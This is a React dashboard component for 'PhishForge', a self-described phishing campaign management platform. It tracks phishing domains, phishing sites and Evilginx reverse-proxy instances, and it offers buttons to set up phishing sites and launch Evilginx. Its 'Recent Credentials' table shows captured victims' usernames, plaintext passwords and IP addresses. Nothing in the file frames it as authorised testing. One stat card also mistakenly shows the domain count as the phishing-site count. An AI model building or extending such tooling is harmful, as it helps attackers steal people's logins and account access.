import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { API_ENDPOINTS, fetchApi } from '../api';

// Import icons
const DomainIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <circle cx="12" cy="12" r="10"></circle>
    <line x1="2" y1="12" x2="22" y2="12"></line>
    <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
  </svg>
);

const PhishingSiteIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
  </svg>
);

const EvilginxIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect>
    <rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect>
    <line x1="6" y1="6" x2="6.01" y2="6"></line>
    <line x1="6" y1="18" x2="6.01" y2="18"></line>
  </svg>
);

const CredentialsIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
  </svg>
);

function Dashboard() {
  const [credentials, setCredentials] = useState([]);
  const [totalCredentialsCount, setTotalCredentialsCount] = useState(0);
  const [systemStatus, setSystemStatus] = useState({});
  const [domainsList, setDomainsList] = useState([]);
  const [phishingSites, setPhishingSites] = useState([]);
  const [evilginxInstances, setEvilginxInstances] = useState([]);
  const [monitors, setMonitors] = useState({});
  const [loading, setLoading] = useState(true);
  const [statsLoading, setStatsLoading] = useState(true);

  useEffect(() => {
    // Fetch all dashboard data
    fetchDashboardData();
    
    // Set up auto-refresh every 30 seconds
    const interval = setInterval(fetchDashboardData, 30000);
    
    return () => clearInterval(interval);
  }, []);

  const fetchDashboardData = async () => {
    try {
      // Fetch all data concurrently
      const [
        systemStatusResponse,
        credentialsResponse,
        domainsResponse,
        phishingResponse,
        evilginxResponse,
        monitorsResponse
      ] = await Promise.allSettled([
        fetchApi(API_ENDPOINTS.status),
        fetchApi(API_ENDPOINTS.credentials.list),
        fetchApi(API_ENDPOINTS.domain.list),
        fetchApi(API_ENDPOINTS.phishing.list),
        fetchApi(API_ENDPOINTS.evilginx.instances),
        fetchApi(API_ENDPOINTS.credentials.monitors)
      ]);

      // Handle system status
      if (systemStatusResponse.status === 'fulfilled') {
        setSystemStatus(systemStatusResponse.value);
      }

      // Handle credentials
      if (credentialsResponse.status === 'fulfilled' && credentialsResponse.value.status === 'success') {
        const credentialsData = credentialsResponse.value;
        
        // Set total count from API response
        setTotalCredentialsCount(credentialsData.count || credentialsData.credentials.length);
        
        // Set recent credentials for display (max 5)
        const recentCreds = credentialsData.credentials
          .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
          .slice(0, 5);
        setCredentials(recentCreds);
      }

      // Handle domains
      if (domainsResponse.status === 'fulfilled' && domainsResponse.value.status === 'success') {
        setDomainsList(domainsResponse.value.domains || []);
      }

      // Handle phishing sites
      if (phishingResponse.status === 'fulfilled' && phishingResponse.value.status === 'success') {
        setPhishingSites(phishingResponse.value.sites || []);
      }

      // Handle evilginx instances
      if (evilginxResponse.status === 'fulfilled' && evilginxResponse.value.status === 'success') {
        setEvilginxInstances(evilginxResponse.value.instances || []);
      }

      // Handle monitors
      if (monitorsResponse.status === 'fulfilled' && monitorsResponse.value.status === 'success') {
        setMonitors(monitorsResponse.value.monitors || {});
      }

      setLoading(false);
      setStatsLoading(false);
    } catch (error) {
      console.error('Error fetching dashboard data:', error);
      setLoading(false);
      setStatsLoading(false);
    }
  };

  // Calculate statistics
  const stats = {
    domains_count: domainsList.length,
    phishing_sites_count: phishingSites.length,
    evilginx_instances_count: evilginxInstances.length,
    credentials_count: totalCredentialsCount,
    monitors_count: Object.keys(monitors).filter(id => monitors[id].active).length,
    uptime: systemStatus.uptime || 'Unknown'
  };

  return (
    <div className="dashboard">
      <h1>Dashboard</h1>
      <p className="dashboard-description">
        Welcome to PhishForge - your centralized phishing campaign management platform.
      </p>

      {/* Stats overview */}
      <div className="stats-grid">
        <div className="stat-card">
          <DomainIcon />
          <div className="stat-value">
            {statsLoading ? (
              <div className="loading-spinner-small"></div>
            ) : (
              stats.domains_count
            )}
          </div>
          <div className="stat-label">Domains</div>
        </div>
        <div className="stat-card">
          <PhishingSiteIcon />
          <div className="stat-value">
            {statsLoading ? (
              <div className="loading-spinner-small"></div>
            ) : (
              stats.domains_count
            )}
          </div>
          <div className="stat-label">Phishing Sites</div>
        </div>
        <div className="stat-card">
          <EvilginxIcon />
          <div className="stat-value">
            {statsLoading ? (
              <div className="loading-spinner-small"></div>
            ) : (
              stats.evilginx_instances_count
            )}
          </div>
          <div className="stat-label">Evilginx Instances</div>
        </div>
        <div className="stat-card">
          <CredentialsIcon />
          <div className="stat-value">
            {statsLoading ? (
              <div className="loading-spinner-small"></div>
            ) : (
              stats.credentials_count
            )}
          </div>
          <div className="stat-label">Captured Credentials</div>
        </div>
      </div>

      {/* Quick actions */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Quick Actions</h2>
        </div>
        <div className="quick-actions">
          <Link to="/domains" className="btn">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="12" y1="8" x2="12" y2="16"></line>
              <line x1="8" y1="12" x2="16" y2="12"></line>
            </svg>
            Setup Domain
          </Link>
          <Link to="/phishing" className="btn">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M12 2l10 6.5v7L12 22 2 15.5v-7L12 2z"></path>
            </svg>
            Setup Phishing Site
          </Link>
          <Link to="/evilginx" className="btn">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
              <line x1="8" y1="21" x2="16" y2="21"></line>
              <line x1="12" y1="17" x2="12" y2="21"></line>
            </svg>
            Launch Evilginx
          </Link>
          <Link to="/monitoring" className="btn">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
              <circle cx="12" cy="12" r="3"></circle>
            </svg>
            View Credentials
          </Link>
        </div>
      </div>

      {/* Recent credentials */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">Recent Credentials</h2>
          <Link to="/monitoring" className="btn btn-outline">View All</Link>
        </div>
        
        {loading ? (
          <div className="loading">
            <div className="loading-spinner"></div>
          </div>
        ) : credentials.length > 0 ? (
          <div className="table-responsive">
            <table>
              <thead>
                <tr>
                  <th>Source</th>
                  <th>Domain</th>
                  <th>Username</th>
                  <th>Password</th>
                  <th>IP Address</th>
                  <th>Timestamp</th>
                </tr>
              </thead>
              <tbody>
                {credentials.map((cred, index) => (
                  <tr key={index}>
                    <td>
                      <span className={`source-badge ${cred.source_type === 'evilginx' ? 'evilginx' : 'apache'}`}>
                        {cred.source_type === 'evilginx' ? 'Evilginx' : 'Apache'}
                      </span>
                    </td>
                    <td>{cred.domain || cred.phishlet || '-'}</td>
                    <td>{cred.username || '-'}</td>
                    <td>{cred.password || '-'}</td>
                    <td>{cred.ip || '-'}</td>
                    <td>{new Date(cred.timestamp).toLocaleString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        ) : (
          <div className="empty-state">
            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1" strokeLinecap="round" strokeLinejoin="round" className="empty-icon">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
            <p>No credentials captured yet.</p>
          </div>
        )}
      </div>

      {/* System status */}
      <div className="card">
        <div className="card-header">
          <h2 className="card-title">System Status</h2>
        </div>
        <div className="system-status">
          <div className="status-item">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="icon-inline">
              <circle cx="12" cy="12" r="10"></circle>
              <polyline points="12 6 12 12 16 14"></polyline>
            </svg>
            <strong>Uptime:</strong> {stats.uptime}
          </div>
          <div className="status-item">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="icon-inline">
              <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
              <circle cx="9" cy="7" r="4"></circle>
              <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
              <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
            </svg>
            <strong>Active Monitors:</strong> {stats.monitors_count}
          </div>
          <div className="status-item">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="icon-inline">
              <path d="M22 12h-4l-3 9L9 3l-3 9H2"></path>
            </svg>
            <strong>Server Health:</strong> 
            <span className={`status ${systemStatus.health === 'good' ? 'status-good' : 'status-warning'}`}>
              {systemStatus.health === 'good' ? 'Good' : systemStatus.health || 'Unknown'}
            </span>
          </div>
          <div className="status-item">
            <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="icon-inline">
              <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline>
            </svg>
            <strong>Services:</strong> 
            <span className={`status ${systemStatus.services === 'running' ? 'status-good' : 'status-warning'}`}>
              {systemStatus.services === 'running' ? 'Running' : systemStatus.services || 'Unknown'}
            </span>
          </div>
        </div>
      </div>

      {/* Add CSS styles */}
      <style jsx>{`
        .dashboard {
          padding: 20px;
          max-width: 1200px;
          margin: 0 auto;
        }

        .dashboard-description {
          color: #666;
          margin-bottom: 30px;
          font-size: 16px;
        }

        .stats-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
          gap: 20px;
          margin-bottom: 30px;
        }

        .stat-card {
          background: white;
          border: 1px solid #e1e5e9;
          border-radius: 8px;
          padding: 24px;
          text-align: center;
          box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
          transition: transform 0.2s ease, box-shadow 0.2s ease;
        }

        .stat-card:hover {
          transform: translateY(-2px);
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

        .stat-card svg {
          color: #4a90e2;
          margin-bottom: 12px;
        }

        .stat-value {
          font-size: 36px;
          font-weight: bold;
          color: #2c3e50;
          line-height: 1;
          margin-bottom: 8px;
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 40px;
        }

        .stat-label {
          font-size: 14px;
          color: #7f8c8d;
          text-transform: uppercase;
          letter-spacing: 0.5px;
          font-weight: 500;
        }

        .loading-spinner-small {
          border: 2px solid #f3f3f3;
          border-top: 2px solid #4a90e2;
          border-radius: 50%;
          width: 20px;
          height: 20px;
          animation: spin 1s linear infinite;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .card {
          background: white;
          border: 1px solid #e1e5e9;
          border-radius: 8px;
          margin-bottom: 24px;
          box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        .card-header {
          padding: 20px 24px;
          border-bottom: 1px solid #e1e5e9;
          display: flex;
          justify-content: space-between;
          align-items: center;
        }

        .card-title {
          margin: 0;
          font-size: 18px;
          font-weight: 600;
          color: #2c3e50;
        }

        .quick-actions {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 16px;
          padding: 24px;
        }

        .btn {
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 12px 16px;
          background: #4a90e2;
          color: white;
          text-decoration: none;
          border-radius: 6px;
          font-weight: 500;
          transition: background-color 0.2s ease;
          justify-content: center;
        }

        .btn:hover {
          background: #357abd;
        }

        .btn-outline {
          background: transparent;
          color: #4a90e2;
          border: 1px solid #4a90e2;
        }

        .btn-outline:hover {
          background: #4a90e2;
          color: white;
        }

        .loading {
          display: flex;
          justify-content: center;
          padding: 40px;
        }

        .loading-spinner {
          border: 4px solid #f3f3f3;
          border-top: 4px solid #4a90e2;
          border-radius: 50%;
          width: 40px;
          height: 40px;
          animation: spin 1s linear infinite;
        }

        .table-responsive {
          overflow-x: auto;
        }

        table {
          width: 100%;
          border-collapse: collapse;
        }

        table th,
        table td {
          padding: 12px;
          text-align: left;
          border-bottom: 1px solid #e1e5e9;
        }

        table th {
          background-color: #f8f9fa;
          font-weight: 600;
          color: #495057;
        }

        .source-badge {
          padding: 4px 8px;
          border-radius: 4px;
          font-size: 11px;
          font-weight: bold;
          text-transform: uppercase;
          color: white;
        }

        .source-badge.evilginx {
          background-color: #e74c3c;
        }

        .source-badge.apache {
          background-color: #27ae60;
        }

        .empty-state {
          text-align: center;
          padding: 40px;
          color: #7f8c8d;
        }

        .empty-icon {
          margin-bottom: 16px;
        }

        .system-status {
          padding: 24px;
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
          gap: 16px;
        }

        .status-item {
          display: flex;
          align-items: center;
          gap: 8px;
        }

        .icon-inline {
          flex-shrink: 0;
        }

        .status {
          margin-left: 8px;
        }

        .status-good {
          color: #27ae60;
          font-weight: 600;
        }

        .status-warning {
          color: #f39c12;
          font-weight: 600;
        }

        @media (max-width: 768px) {
          .stats-grid {
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          }

          .quick-actions {
            grid-template-columns: 1fr;
          }

          .system-status {
            grid-template-columns: 1fr;
          }
        }
      `}</style>
    </div>
  );
}

export default Dashboard;